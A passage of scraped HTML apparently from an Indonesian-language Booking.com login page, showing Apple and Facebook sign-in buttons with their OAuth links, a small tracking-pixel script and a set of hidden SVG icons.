%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;dt=1758946077&amp;bkng_action=hotel&amp;response_type=sso&amp;aid=356980&amp;lang=id&amp;prompt=apple"
data-popup-href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?bkng_action=hotel&amp;dt=1758946077&amp;lang=id&amp;response_type=sso&amp;aid=356980&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;state=Uu0DqvSP9Uxl72rkGSVZLlJiNeYXTAYwCDIQcfE30DdSRS2cmccu2J0ajue6ev-W26WNSqHU45uYapDo8TNSlLF4vNmefMoqZG7_MGrZzOhQMPEr5JMhNBwmL2ToS81DCsr-sUDJqmnFNYYXbwbf3LNx5KqJOjptBbZoiOUyFl5ZgEA4cCb256B3RvbWpOaE_UmGpOvkAB1_6RckKlhEGtg3OxGV9DYYS9CjvVo0S6sZoz7eTiYVuhizuMtPwIjs6aVS2_Au6GV63RyWVuAo73cOUDVIgfOknjijBoXn9oObdQMkqNH85RcMbCWH4lux-2L5xvBzS07Y3g99pqL-lLiUiWEXteNBbpa9ZbskwfjAprHhn7mPK9GO3Gk5V2hp2ZzWLH5RVxCcM3NIp8N8rBarbF7GIIpdk9SC8tIlErf3GQ6kfq0ojMRDLlVFUxI8hQHGKYpHg93Of_AZQcwqbWqJ29k9zG-Y35EfDIaX32y0A4kmcgvfCjtYww-PExodsZh8i64sBY-4bhjFDl_mUb8AYcNJ-FDf2l82SmKn2_5sMnDP4T2bevshEK4fvgHuxpTfOKqEe3kGsQuscyQ-iEM9GKoRfpszzkL5Kk4y7uwD3VOXHeEYZqGRmQlfVuW3Bs4uocrEo0dMAZO-qBNzfw&amp;popup=1&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;prompt=apple"
class="iam_login_form__social-button iam_login_form__social-button-apple bui-button bui-button--secondary "
title="Login dengan Apple"
aria-label="Login dengan Apple"
data-component="iam/social-button"
data-mask="true"
>
<div class="iam_login_form__social-button-content">
<div class="iam_login_form__social-button-image">
<svg class="bk-icon -social-providers-apple" height="24" width="24" viewBox="0 0 170 170" role="presentation" aria-hidden="true" focusable="false"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.197-2.12-9.973-3.17-14.34-3.17-4.58 0-9.492 1.05-14.746 3.17-5.262 2.13-9.501 3.24-12.742 3.35-4.929.21-9.842-1.96-14.746-6.52-3.13-2.73-7.045-7.41-11.735-14.04-5.032-7.08-9.169-15.29-12.41-24.65-3.471-10.11-5.211-19.9-5.211-29.378 0-10.857 2.346-20.221 7.045-28.068 3.693-6.303 8.606-11.275 14.755-14.925s12.793-5.51 19.948-5.629c3.915 0 9.049 1.211 15.429 3.591 6.362 2.388 10.447 3.599 12.238 3.599 1.339 0 5.877-1.416 13.57-4.239 7.275-2.618 13.415-3.702 18.445-3.275 13.63 1.1 23.87 6.473 30.68 16.153-12.19 7.386-18.22 17.731-18.1 31.002.11 10.337 3.86 18.939 11.23 25.769 3.34 3.17 7.07 5.62 11.22 7.36-.9 2.61-1.85 5.11-2.86 7.51zM119.11 7.24c0 8.102-2.96 15.667-8.86 22.669-7.12 8.324-15.732 13.134-25.071 12.375a25.222 25.222 0 0 1-.188-3.07c0-7.778 3.386-16.102 9.399-22.908 3.002-3.446 6.82-6.311 11.45-8.597 4.62-2.252 8.99-3.497 13.1-3.71.12 1.083.17 2.166.17 3.24z"/></svg>
</div>
</div>
</a>
<a
href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?state=UrMEqvSP9Uxl72rD-cf0kqa9YEdqdkxzWReZxhRWwMPQqmPuGbrMWEuPHGdt_UwDM0h8d20VAVvKw_t6rFy-wDZe5jOlHoAa0-HrS8CE34_3ka4yFauwJhLVH8UqslNXwtdmtAEy8mlj80MRPcxa_vfqL0DwIdAqem1ERLGyvljXlExJ1jTxu0MKVD47WYkvYpwS5arjSgVfwqt3g-qzC8j0mnNFcAZyaDA21jUSbFZmXoIHpDcRA0SIZzZQ8wJ7AU1qTOUVHd2ToVvP81LFPPs7Hc5g7OG3Vb8rSn7tChtum-XKczLMLJikj20FfEKZgK4C-59JfwkVQ_vf7NyRLWmmV0o1Ygqj5bZNrdjD1YSGl5lDRS2VKdnMsK_B06KR29-cnHNEcYJTMsnm1Uaztdo5ZJ3_7n1EN9lYrMaA6R6hA4326IOW3i-qP2Ag6jk4oUpDTMJkfvTQv0lCdJZB7nbufPCAjOXn-m7VCXaXUe9DfE8F5dtC10XystJlf6MYKzibb24flHJ_hl-MNFPsb5UZre_xP9TRx5HP8Tfi6zZAZK-VGV7KTmUMhmMI24IZHSmyUCIm0mTeEddYzeUvXMX0wB666X9jmYPtD3SuskfQ6it12fkge0OrcbMCRnBc1Y3lZOIdNvIf90Ch1cuft1TRy7WMFua2NcUXan0tHvZxQ_1bc5JnS5Vbn8NzEi813xOAsYqjJORazicCiIYBX-Km4RQVONLzN5HTUp4dwa1yl_84v8c&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;dt=1758946077&amp;bkng_action=hotel&amp;response_type=sso&amp;aid=356980&amp;lang=id&amp;prompt=facebook"
data-popup-href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?bkng_action=hotel&amp;dt=1758946077&amp;lang=id&amp;response_type=sso&amp;aid=356980&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;state=Uu0DqvSP9Uxl72rkGSVZLlJiNeYXTAYwCDIQcfE30DdSRS2cmccu2J0ajue6ev-W26WNSqHU45uYapDo8TNSlLF4vNmefMoqZG7_MGrZzOhQMPEr5JMhNBwmL2ToS81DCsr-sUDJqmnFNYYXbwbf3LNx5KqJOjptBbZoiOUyFl5ZgEA4cCb256B3RvbWpOaE_UmGpOvkAB1_6RckKlhEGtg3OxGV9DYYS9CjvVo0S6sZoz7eTiYVuhizuMtPwIjs6aVS2_Au6GV63RyWVuAo73cOUDVIgfOknjijBoXn9oObdQMkqNH85RcMbCWH4lux-2L5xvBzS07Y3g99pqL-lLiUiWEXteNBbpa9ZbskwfjAprHhn7mPK9GO3Gk5V2hp2ZzWLH5RVxCcM3NIp8N8rBarbF7GIIpdk9SC8tIlErf3GQ6kfq0ojMRDLlVFUxI8hQHGKYpHg93Of_AZQcwqbWqJ29k9zG-Y35EfDIaX32y0A4kmcgvfCjtYww-PExodsZh8i64sBY-4bhjFDl_mUb8AYcNJ-FDf2l82SmKn2_5sMnDP4T2bevshEK4fvgHuxpTfOKqEe3kGsQuscyQ-iEM9GKoRfpszzkL5Kk4y7uwD3VOXHeEYZqGRmQlfVuW3Bs4uocrEo0dMAZO-qBNzfw&amp;popup=1&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;prompt=facebook"
class="iam_login_form__social-button iam_login_form__social-button-facebook bui-button bui-button--secondary "
title="Login dengan Facebook"
aria-label="Login dengan Facebook"
data-component="iam/social-button"
data-mask="true"
>
<div class="iam_login_form__social-button-content">
<div class="iam_login_form__social-button-image">
<svg class="bk-icon -social-providers-facebook" height="24" width="24" viewBox="0 0 24 24" role="presentation" aria-hidden="true" focusable="false"><path d="m22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z" fill="#4469b0"/></svg>
</div>
</div>
</a>
</div>
<div class="iam_login_text iam_login_text--footer">
Belum punya akun? <a href="https:&#47;&#47;account.booking.com&#47;auth&#47;oauth2?state=UrMEqvSP9Uxl72rD-cf0kqa9YEdqdkxzWReZxhRWwMPQqmPuGbrMWEuPHGdt_UwDM0h8d20VAVvKw_t6rFy-wDZe5jOlHoAa0-HrS8CE34_3ka4yFauwJhLVH8UqslNXwtdmtAEy8mlj80MRPcxa_vfqL0DwIdAqem1ERLGyvljXlExJ1jTxu0MKVD47WYkvYpwS5arjSgVfwqt3g-qzC8j0mnNFcAZyaDA21jUSbFZmXoIHpDcRA0SIZzZQ8wJ7AU1qTOUVHd2ToVvP81LFPPs7Hc5g7OG3Vb8rSn7tChtum-XKczLMLJikj20FfEKZgK4C-59JfwkVQ_vf7NyRLWmmV0o1Ygqj5bZNrdjD1YSGl5lDRS2VKdnMsK_B06KR29-cnHNEcYJTMsnm1Uaztdo5ZJ3_7n1EN9lYrMaA6R6hA4326IOW3i-qP2Ag6jk4oUpDTMJkfvTQv0lCdJZB7nbufPCAjOXn-m7VCXaXUe9DfE8F5dtC10XystJlf6MYKzibb24flHJ_hl-MNFPsb5UZre_xP9TRx5HP8Tfi6zZAZK-VGV7KTmUMhmMI24IZHSmyUCIm0mTeEddYzeUvXMX0wB666X9jmYPtD3SuskfQ6it12fkge0OrcbMCRnBc1Y3lZOIdNvIf90Ch1cuft1TRy7WMFua2NcUXan0tHvZxQ_1bc5JnS5Vbn8NzEi813xOAsYqjJORazicCiIYBX-Km4RQVONLzN5HTUp4dwa1yl_84v8c&amp;redirect_uri=https%3A%2F%2Fsecure.booking.com%2Flogin.html%3Fop%3Doauth_return&amp;client_id=vO1Kblk7xX9tUn2cpZLS&amp;dt=1758946077&amp;bkng_action=hotel&amp;response_type=sso&amp;aid=356980&amp;lang=id&prompt=register"
class="iam_login_link"
>Buat akun Anda</a>
</div>
</div>
</div>
</div>
</div>
<div style="display: none;" id="logo-not-document-write"></div>
<script type="text/javascript" nonce="cH3DZKVyvb8x5Uh">
setTimeout(function(){
var img = new Image(1,1);
img.src = '/logo?ver=1&sid=7ddc46c9c1086cdb3bc11bc91f12833b&t='+1758946076+1;
},0);
</script>
<noscript>
<img style="display:none" src="/logo?ver=0&sid=7ddc46c9c1086cdb3bc11bc91f12833b&t=1758946076">
</noscript>
<svg class="bk-icon -iconset-close_circle" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M64 8a56 56 0 1 0 56 56A56 56 0 0 0 64 8zm22.2 69.8a6 6 0 1 1-8.4 8.4L64 72.5 50.2 86.2a6 6 0 0 1-8.4-8.4L55.5 64 41.8 50.2a6 6 0 0 1 8.4-8.4L64 55.5l13.8-13.7a6 6 0 0 1 8.4 8.4L72.5 64z"/></svg>
<svg class="bk-icon -iconset-close_bold" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M75.3 64l26.4-26.3a8 8 0 0 0-11.4-11.4L64 52.7 37.7 26.3a8 8 0 0 0-11.4 11.4L52.7 64 26.3 90.3a8 8 0 0 0 11.3 11.4L64 75.3l26.3 26.4a8 8 0 0 0 11.4-11.4z"/></svg>
<svg class="bk-icon -iconset-navarrow_right_bold" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M48 104a8 8 0 0 1-5.7-13.7L68.7 64 42.3 37.7a8 8 0 0 1 11.4-11.4L91.3 64l-37.6 37.7A8 8 0 0 1 48 104z"/></svg>
<svg class="bk-icon -iconset-navarrow_left_bold" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M80 104a8 8 0 0 1-5.7-2.3L36.7 64l37.6-37.7a8 8 0 0 1 11.4 11.4L59.3 64l26.4 26.3A8 8 0 0 1 80 104z"/></svg>
<svg class="bk-icon -iconset-clock" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M64 8a56 56 0 1 0 56 56A56 56 0 0 0 64 8zm0 104a48 48 0 1 1 48-48 48 48 0 0 1-48 48zm24-44a4 4 0 0 1-4 4H56V36a4 4 0 0 1 8 0v28h20a4 4 0 0 1 4 4z"/></svg>
<svg class="bk-icon -iconset-centermap" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M64 78a14 14 0 1 1 14-14 14 14 0 0 1-14 14zM27.4 48.6A2 2 0 0 0 24 50v10H8v8h16v10.3a2 2 0 0 0 3.4 1.4l14.1-14.2a2 2 0 0 0 0-2.8zM120 60h-16V50a2 2 0 0 0-3.4-1.4L86.5 62.7a2 2 0 0 0 0 2.8l14.1 14.2a2 2 0 0 0 3.4-1.4V68h16zM65.4 86.6a2 2 0 0 0-2.8 0l-14.2 14.2a2 2 0 0 0 1.4 3.4H60V120h8v-15.8h10.2a2 2 0 0 0 1.4-3.4zm12.8-62.4H68V8h-8v16.1H49.9a2 2 0 0 0-1.5 3.4l14.2 14.2a2 2 0 0 0 2.8 0l14.2-14.2a2 2 0 0 0-1.4-3.4z"/></svg>
<svg class="bk-icon -iconset-airplane" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M8.3 83.1l2.8-2.8a1 1 0 0 1 .7-.3h27.3l16-17.5-41.7-32a4 4 0 0 1-1.1-5.3l1.3-2.8a4 4 0 0 1 5.1-1.6l55.5 21.1L98 16a28.6 28.6 0 0 1 18-8 4 4 0 0 1 4 4 28.6 28.6 0 0 1-8 18L86.6 53.4l21 55.3a4 4 0 0 1-1.6 5.1l-2.7 1.4A4 4 0 0 1 98 114L66 72.3 48 89v27.3a1 1 0 0 1-.3.7l-2.8 2.8a1 1 0 0 1-1.6-.2L30.7 97.3 8.5 84.7a1 1 0 0 1-.2-1.6z"/></svg>
<svg class="bk-icon -iconset-landmark" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><rect x="8" y="106" width="112" height="10" rx="2" ry="2"/><path d="M24 60a2 2 0 0 0-2 1.8v34.4a2 2 0 0 0 2 1.8h8a2 2 0 0 0 2-1.8V61.8a2 2 0 0 0-2-1.8zm24 0a2 2 0 0 0-2 1.8v34.4a2 2 0 0 0 2 1.8h8a2 2 0 0 0 2-1.8V61.8a2 2 0 0 0-2-1.8zm24 0a2 2 0 0 0-2 1.8v34.4a2 2 0 0 0 2 1.8h8a2 2 0 0 0 2-1.8V61.8a2 2 0 0 0-2-1.8zm24 0a2 2 0 0 0-2 1.8v34.4a2 2 0 0 0 2 1.8h8a2 2 0 0 0 2-1.8V61.8a2 2 0 0 0-2-1.8zm-85.8-8h107.6a2 2 0 0 0 1.3-3.7L65 12.3a2 2 0 0 0-2.2 0l-53.9 36a2 2 0 0 0 1.3 3.7z"/></svg>
<svg class="bk-icon -iconset-navarrow_left" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M73.7 96a4 4 0 0 1-2.9-1.2L40 64l30.8-30.8a4 4 0 0 1 5.7 5.6L51.3 64l25.2 25.2a4 4 0 0 1-2.8 6.8z"/></svg>
<svg class="bk-icon -iconset-navarrow_right" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M54.3 96a4 4 0 0 1-2.8-6.8L76.7 64 51.5 38.8a4 4 0 0 1 5.7-5.6L88 64 57.2 94.8a4 4 0 0 1-2.9 1.2z"/></svg>
<svg class="bk-icon -iconset-sort_filters" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M40 88h8v32h-8v-8H16a8 8 0 0 1 0-16h24zm72 8H56v16h56a8 8 0 0 0 0-16zM16 72h72v8h8V48h-8v8H16a8 8 0 0 0 0 16zm96-16h-8v16h8a8 8 0 0 0 0-16zM16 32h40v8h8V8h-8v8H16a8 8 0 0 0 0 16zm104-8a8 8 0 0 0-8-8H72v16h40a8 8 0 0 0 8-8z"/></svg>
<svg class="bk-icon -iconset-walk" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M103.1 33.6c-1-8.7-2-22.2-12.3-25.2C80 5.2 75.5 21.9 73.3 29.3a96.3 96.3 0 0 0-3 29.5 4 4 0 0 0 3.4 3.8l19 2.6a4 4 0 0 0 4.3-2.6c3-8.6 7-20.9 6.1-29zM89 74.8l-13.7-1.9a4 4 0 0 0-4.5 3.7c-1.1 22.8 16.5 26.3 21.5 3a4 4 0 0 0-3.3-4.8zM54.7 53.6C50.2 46 43.7 34.3 33.1 36c-11 1.7-8.3 18.8-7.2 26.4a95.8 95.8 0 0 0 9.5 28 4 4 0 0 0 4.7 2l18.3-5.8a4 4 0 0 0 2.8-4.1c-.8-9-2.3-22-6.5-29zm-11.5 52.7c8.4 21.2 25.8 16.9 20.8-6.5a4 4 0 0 0-5-2.9L45.6 101a4 4 0 0 0-2.5 5.3z"/></svg>
<svg class="bk-icon -iconset-train" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M112 96V64c0-12-4.8-34-7-43.5a8 8 0 0 0-5.5-5.9C91.5 12.3 81.8 8 64 8s-27.4 4.3-35.5 6.6a8 8 0 0 0-5.6 6C20.8 30 16 52 16 64v32a8 8 0 0 0 8 8h11.8l-17.6 14.2a1 1 0 0 0 .6 1.8h12.8a1 1 0 0 0 .7-.3L48 104h32l15.7 15.7a1 1 0 0 0 .7.3h12.8a1 1 0 0 0 .6-1.8L92.2 104H104a8 8 0 0 0 8-8zM56 20a4 4 0 0 1 4-4h8a4 4 0 0 1 4 4 4 4 0 0 1-4 4h-8a4 4 0 0 1-4-4zM34 94a10 10 0 1 1 10-10 10 10 0 0 1-10 10zm-6-30a4 4 0 0 1-4-4.8l4.3-24a4 4 0 0 1 4-3.2h63.6a4 4 0 0 1 3.9 3l4 24a4 4 0 0 1-4 5zm66 30a10 10 0 1 1 10-10 10 10 0 0 1-10 10z"/></svg>
<svg class="bk-icon -iconset-car_front" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M109.2 48.9L100 26a16 16 0 0 0-14.8-10H42.8A16 16 0 0 0 28 26l-9.1 23A16 16 0 0 0 8 64v24a8 8 0 0 0 8 8v8a8 8 0 0 0 16 0v-8h64v8a8 8 0 0 0 16 0v-8a8 8 0 0 0 8-8V64a16 16 0 0 0-10.8-15.1zM35.4 29a8 8 0 0 1 7.4-5h42.4a8 8 0 0 1 7.4 5l7.6 19H27.8zM26 76a10 10 0 1 1 10-10 10 10 0 0 1-10 10zm76 0a10 10 0 1 1 10-10 10 10 0 0 1-10 10z"/></svg>
<svg class="bk-icon -iconset-food_and_drink" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M64 39.4c0-12.7-4-24-10.2-31.4H18.2A49.6 49.6 0 0 0 8 39.4c0 20.4 10.4 37.4 24 40.2V112H20a4 4 0 0 0 0 8h32a4 4 0 0 0 0-8H40V79.6c13.6-2.8 24-19.8 24-40.2zM22.2 16h27.6c4 6.2 6.2 14.5 6.2 23.4v.6H16v-.6c0-9 2.2-17.2 6.2-23.4zM120 44a12 12 0 0 1-12 12h-3.6l3.4 59.8a4 4 0 0 1-4 4.2h-7.6a4 4 0 0 1-4-4.2L95.6 56H92a12 12 0 0 1-12-12l3.9-35.1a1 1 0 0 1 1-.9H87a1 1 0 0 1 1 1v19a4 4 0 0 0 4 4h4.8L98 9a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1l1.1 23h4.9a4 4 0 0 0 4-4V9a1 1 0 0 1 1-1h2.1a1 1 0 0 1 1 .9z"/></svg>
<svg class="bk-icon -iconset-shopping_bag" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M104 48c-.6-4-3.7-8-8-8H32c-4.3 0-7.5 3.4-8 8l-8 64a8.1 8.1 0 0 0 8 8h80a8.1 8.1 0 0 0 8-8zM48 62a6 6 0 0 1-6-6 6 6 0 1 1 6 6zm32 fc0303 6 0 0 1-6-6 6 6 0 1 1 6 6zm5.6-32.5a21.6 21.6 0 0 0-43.2 0v2.6h6.8v-2.6a14.8 14.8 0 0 1 29.6 0v2.6h6.8v-2.6z"/></svg>
<svg class="bk-icon -iconset-theater" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M80 56.9V8H8v48.9C8 78.5 23.9 96 43.4 96h1.2C64 96 80 78.5 80 56.9zM44.6 88h-1.2C28.4 88 16 74 16 56.9V16h56v40.9C72 74 59.7 88 44.6 88zM120 32v48.9c0 21.6-15.9 39.1-35.4 39.1h-1.2c-12.2 0-23-6.8-29.3-17.2a40.8 40.8 0 0 0 7.8-2.7c5 7.2 12.8 11.9 21.5 11.9h1.2c15 0 27.4-14 27.4-31.1V40H88v-8zM30.8 42.8a4 4 0 0 1-5.6-5.6l8-8a4 4 0 0 1 5.6 5.6zM92 64a4 4 0 0 1-2.8-6.8l8-8a4 4 0 0 1 5.6 5.6l-8 8A4 4 0 0 1 92 64zM62.8 37.2a4 4 0 1 1-5.6 5.6l-8-8a4 4 0 1 1 5.6-5.6zm-3.6 20.4a4 4 0 0 1 .7 3.4A16.5 16.5 0 0 1 28 61a4 4 0 0 1 3.9-5h24a4 4 0 0 1 3.2 1.6zM84 79a16.4 16.4 0 0 1 15.9 12 4 4 0 0 1-3.9 5H72a4 4 0 0 1-3.9-5A16.4 16.4 0 0 1 84 79z"/></svg>
<svg class="bk-icon -iconset-tree" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M72 84.8V108a4 4 0 0 0 4 4h7.8a4.1 4.1 0 0 1 4.1 3.2A4 4 0 0 1 84 120H44a4 4 0 0 1-4-4.8 4.1 4.1 0 0 1 4.1-3.2H52a4 4 0 0 0 4-4V84.8a24 24 0 1 1-20.5-43.2 28.5 28.5 0 1 1 56.1-.4A24 24 0 1 1 72 84.8z"/></svg>
<svg class="bk-icon -iconset-institution" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M120 116a4 4 0 0 1-4 4H12a4 4 0 0 1 0-8h104a4 4 0 0 1 4 4zM16 92v8a4 4 0 0 0 8 0v-8a4 4 0 0 0-8 0zm16 0v8a4 4 0 0 0 8 0v-8a4 4 0 0 0-8 0zm16 0v8a4 4 0 0 0 8 0v-8a4 4 0 0 0-8 0zm24 0v8a4 4 0 0 0 8 0v-8a4 4 0 0 0-8 0zm16 0v8a4 4 0 0 0 8 0v-8a4 4 0 0 0-8 0zm16 0v8a4 4 0 0 0 8 0v-8a4 4 0 0 0-8 0zM12 80h104a4 4 0 0 0 2-7.6L68 56V35c10.8.9 25.4-9.6 36 0V12.2c-11.7-10.6-24.4 2.4-36 .4V12a4 4 0 0 0-8 0v44L10 72.4a4 4 0 0 0 2 7.6z"/></svg>
<svg class="bk-icon -iconset-gallery" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M64.2 8h-.4a7 7 0 1 0 .4 0zm-7.1 12.9L38 40l-2-2 19.6-19.6a9.7 9.7 0 0 0 1.5 2.5z"/><path d="M116.4 103.7c-.9-2-2-3.8-1.4-6 1.3-4.3 2.8-8.6 4-13a34.5 34.5 0 0 0 1-9.7c0-4.8-2.7-9.3-4-14-.6-2.1-1.7-4-.6-6.3s2.3-4.4 3.6-6.7c2-3.6.3-8.1-2-10-2.5-2-5.8-2-9-1-4 1.3-7 2-11 3a25.3 25.3 0 0 1-7 1c-2.5-.2-4-1.6-6-3a8.2 8.2 0 0 0-8-1c-2.8 1.1-5.5 2.3-8.3 3.3a9.8 9.8 0 0 1-7.4 0c-2.9-1-5.5-2.1-8.3-3.3a8.2 8.2 0 0 0-8 1c-2 1.4-3.5 2.8-6 3a25.3 25.3 0 0 1-7-1c-4-1-7-1.7-11-3-3.2-1-6.5-1-9 1-2.3 1.9-4 6.4-2 10l3.5 6.7c1.1 2.3 0 4.2-.5 6.3-1.3 4.6-4 9.2-4 14a34.5 34.5 0 0 0 1 9.8c1.2 4.3 2.7 8.6 4 12.9.5 2.1-.6 4-1.4 6a43.7 43.7 0 0 0-2.5 4.8C8 112 9 116 12 118a9 9 0 0 0 7.7 1.4L32 116a10.4 10.4 0 0 1 6.8-.2c2.2.7 4.3 1.8 6.5 2.6a28.6 28.6 0 0 0 4.4 1.4c2.8.6 5.2-.6 7.4-2C59 116.4 62 115 64 115s5 1.5 7 2.7c2.1 1.5 4.5 2.7 7.3 2.1a28.6 28.6 0 0 0 4.4-1.4c2.2-.8 4.3-1.9 6.5-2.6a10.4 10.4 0 0 1 6.8.2l12.3 3.5a9 9 0 0 0 7.7-1.5c3-2 4-6 2.8-9.6a43.7 43.7 0 0 0-2.4-4.7zM16.7 113a1.8 1.8 0 1 1 1.8-1.8 1.8 1.8 0 0 1-1.8 1.8zm0-66.5a1.8 1.8 0 1 1 1.8-1.8 1.8 1.8 0 0 1-1.8 1.8zM106 99a7 7 0 0 1-7 7H29a7 7 0 0 1-7-7V57a7 7 0 0 1 7-7h70a7 7 0 0 1 7 7zm5.3 14a1.8 1.8 0 1 1 1.7-1.8 1.8 1.8 0 0 1-1.7 1.8zm0-66.5a1.8 1.8 0 1 1 1.7-1.7 1.8 1.8 0 0 1-1.7 1.7z"/><path d="M70.8 20.9L90 40l2-2-19.6-19.6a9.7 9.7 0 0 1-1.6 2.5z"/><circle cx="85.2" cy="66.8" r="10.8"/><polygon points="99 102 81 84 73.8 91.2 55.8 73.2 27 102 99 102"/></svg>
<svg class="bk-icon -iconset-attractions" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M110 54a10 10 0 0 0-3 .5 43.7 43.7 0 0 0-5.9-14.2A10 10 0 1 0 87.6 27a43.7 43.7 0 0 0-14-5.8 10 10 0 1 0-19 0 43.7 43.7 0 0 0-14 5.8 10 10 0 1 0-13.7 13.4A43.7 43.7 0 0 0 21 54.5a10 10 0 1 0 0 19 43.7 43.7 0 0 0 5.8 14A10 10 0 1 0 40.3 101a43.8 43.8 0 0 0 10.3 4.9l-2 10.5a3 3 0 0 0 2.9 3.6h24.8a3 3 0 0 0 3-3.6L77.2 106a43.8 43.8 0 0 0 10.7-5 10 10 0 1 0 13.5-14 43.7 43.7 0 0 0 5.6-13.6 10 10 0 1 0 3-19.5zm-36.3 7.5a10 10 0 0 0-1.2-2.7l18.6-18.5a35.8 35.8 0 0 1 8.8 21.2zM69 55.3a10 10 0 0 0-2.5-1V28.1a35.8 35.8 0 0 1 21 8.7zm-7.5-1a10 10 0 0 0-2.6 1.1L40.3 37a35.8 35.8 0 0 1 21.2-8.9zM55.4 59a10 10 0 0 0-1 2.5H28a35.8 35.8 0 0 1 8.7-21zm-1 7.5a10 10 0 0 0 1 2.5L36.8 87.5a35.8 35.8 0 0 1-8.7-21zM91 87.3L72.6 69a10 10 0 0 0 1-2.5H100a35.8 35.8 0 0 1-8.1 20.4l-.7.4zm-50.8 3.8l18.5-18.5a10 10 0 0 0 2.7 1V90h-5.2a3 3 0 0 0-3 2.4l-1 5.6a36 36 0 0 1-12-7zm34.2 1.3a3 3 0 0 0-3-2.4h-5V73.7a10 10 0 0 0 2.7-1.1L87.6 91l-.1.3A36 36 0 0 1 75.6 98z"/></svg>
<svg class="bk-icon -iconset-monument" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M96 116a4 4 0 0 1-4 4H36a4 4 0 0 1 0-8h56a4 4 0 0 1 4 4zm-46-12h28a2 2 0 0 0 2-2.1l-3.9-77.6a2 2 0 0 0-.4-1l-10-14.5a2 2 0 0 0-3.3 0L52.3 23.2a2 2 0 0 0-.4 1.1L48 102a2 2 0 0 0 2 2.1z"/></svg>
<svg class="bk-icon -iconset-triangle_down" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="m40 56 24 24 24-24z"/></svg>
<svg class="bk-icon -iconset-magnifying_glass" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M118.8 113.2l-31-31A4 4 0 0 0 85 81a44 44 0 1 0-4 4 4 4 0 0 0 1.2 2.8l31 31a4 4 0 0 0 5.6-5.7zM52 88a36 36 0 1 1 36-36 36 36 0 0 1-36 36z"/></svg>
<svg class="bk-icon -iconset-thumbs_up_square" height="128" style="display:none;" width="128" viewBox="0 0 128 128" role="presentation" aria-hidden="true" focusable="false"><path d="M112 8H16a8 8 0 0 0-8 8v96a8 8 0 0 0 8 8h96a8 8 0 0 0 8-8V16a8 8 0 0 0-8-8zM48 96H24V58h24zm56-25a8.7 8.7 0 0 1-2 6 8.9 8.9 0 0 1 1 4 6.9 6.9 0 0 1-5 7c-.5 4-4.8 8-9 8H56V58l10.3-23.3a5.4 5.4 0 0 1 10.1 2.7 10.3 10.3 0 0 1-.6 2.7L72 52h23c4.5 0 9 3.5 9 8a9.2 9.2 0 0 1-2 5.3 7.5 7.5 0 0 1 2 5.7z"/></svg>
